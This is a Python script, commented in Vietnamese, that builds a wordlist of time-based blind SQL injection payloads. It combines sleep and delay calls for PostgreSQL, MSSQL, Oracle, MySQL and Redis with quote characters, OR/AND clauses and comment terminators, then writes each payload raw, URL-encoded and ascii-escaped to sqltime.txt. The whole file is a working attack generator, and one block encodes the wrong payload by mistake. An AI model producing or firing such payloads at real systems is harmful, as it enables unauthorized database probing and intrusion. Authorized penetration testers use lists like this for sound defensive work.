import urllib.parse
import base64
def write_to_file(file_path, content):
    try:
        # Mở tệp với chế độ ghi
        with open(file_path, "a",encoding="utf-8") as file:
            # Ghi nội dung vào tệp
            file.write(content+'\n')
        print(f"Đã ghi nội dung vào tệp {file_path} thành công.")
    except Exception as e:
        print(f"Có lỗi xảy ra khi ghi nội dung vào tệp {file_path}: {e}")
contents = {
    'pg_sleep(25)',
    "WAITFOR DELAY '00:00:25'",
    'dbms_lock.sleep(25)',
    "dbms_pipe.receive_message(('a'),25)",
    'redis.call("TIME")[25]',
    'sleep(25)'
}
# Khai báo mảng chứa các ký tự đặc biệt
postregexs = [';','"',"'",'+',' ']
preregexs = ['--','--+-','#','/**/','-- -']

for post in postregexs:
    for pre in preregexs:
        for cont in contents:
            payload = post + ' ' + cont +' '+pre
            write_to_file('sqltime.txt', payload)
            write_to_file('sqltime.txt',  urllib.parse.quote(payload))
            write_to_file('sqltime.txt',  urllib.parse.quote_plus(payload))
            write_to_file('sqltime.txt', ascii(payload))

            
            payload2 = post + '+' + cont +'+'+pre 
            write_to_file('sqltime.txt', payload2)
            write_to_file('sqltime.txt', urllib.parse.quote(payload2))
            write_to_file('sqltime.txt', ascii(payload2))
            
            payload3 =' OR'+post +'+'+ cont +'+'+pre  
            write_to_file('sqltime.txt', payload3)
            write_to_file('sqltime.txt', urllib.parse.quote(payload3))
            write_to_file('sqltime.txt', ascii(payload3))

         
            payload4 =' AND'+post + '+' + cont +'+'+pre  
            write_to_file('sqltime.txt', payload4)
            write_to_file('sqltime.txt', urllib.parse.quote(payload4))
            write_to_file('sqltime.txt', ascii(payload4))

            
            payload5 =' AND'+post + 'AND ' + cont +' '+pre 
            write_to_file('sqltime.txt', payload5)
            write_to_file('sqltime.txt', urllib.parse.quote(payload5) )
            write_to_file('sqltime.txt',  urllib.parse.quote_plus(payload5))
            write_to_file('sqltime.txt', ascii(payload5))
            
            payload6 =' OR'+post + 'OR' ' '+ cont +' '+pre  
            write_to_file('sqltime.txt', payload6)
            write_to_file('sqltime.txt', urllib.parse.quote(payload6) )
            write_to_file('sqltime.txt',  urllib.parse.quote_plus(payload6))
            write_to_file('sqltime.txt', ascii(payload6))

        
            payload8 = post + ' AND ' + cont +'+'+pre  
            write_to_file('sqltime.txt', payload8)
            write_to_file('sqltime.txt', urllib.parse.quote(payload8) )
            write_to_file('sqltime.txt', ascii(payload8))


            payload9 = post + ' OR ' + cont +'+'+pre  
            write_to_file('sqltime.txt', payload9)
            write_to_file('sqltime.txt', urllib.parse.quote(payload8) )
            write_to_file('sqltime.txt', ascii(payload9))

            
            payload10 = post + ' AND ' + cont +' '+pre  
            write_to_file('sqltime.txt', payload10)
            write_to_file('sqltime.txt', urllib.parse.quote(payload10) )
            write_to_file('sqltime.txt', ascii(payload10))

                        
            payload11 = post + ' OR ' + cont +' '+pre  
            write_to_file('sqltime.txt', payload11)
            write_to_file('sqltime.txt', urllib.parse.quote(payload11) )
            write_to_file('sqltime.txt', ascii(payload11))
